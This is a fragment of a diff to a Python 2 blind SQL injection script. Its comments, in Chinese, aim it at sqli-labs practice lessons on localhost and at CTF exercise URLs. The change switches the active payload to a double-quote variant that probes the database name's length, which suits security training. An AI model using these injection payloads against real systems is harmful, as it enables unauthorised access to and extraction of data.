@@ -8,7 +8,7 @@ import time
 # ulr='http://ctf5.shiyanbar.com/web/index_3.php?id='#简单sql注入3
 #url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
 # url='http://localhost/sqli-labs/Less-5/?id=' #sqli-lab lesson 5
-url='http://localhost/sqli-labs/Less-13/?id=' #sqli-lab lesson 8
+url='http://localhost/sqli-labs/Less-14/?id=' #sqli-lab lesson 8
 #定义语法关键字测试使用的载荷库
 f = file("result.txt", "w+")
 # 定义攻击载荷
@@ -19,8 +19,8 @@ versionlen=0
 stop=False
 for i in range(1,10):
     #payload1_version = "1%27%20and%20length(database())="  # 查看length（version）函数判断版本名长度 #单引号 lesson5
-    #payload1_version = "1%22%20and%20length(database())="  # 查看length（version）函数判断版本名长度 #双引号lesson6
-    payload1_version = "-1') or length(database())="  # 查看length（version）函数判断版本名长度 #括号lesson13
+    payload1_version = '-1"'+" or length(database())="  # 查看length（version）函数判断版本名长度 #双引号lesson6
+    #payload1_version = "-1') or length(database())="  # 查看length（version）函数判断版本名长度 #括号lesson13
     try:
         payload =payload1_version + str(i) + payload_end
         # print url + payload
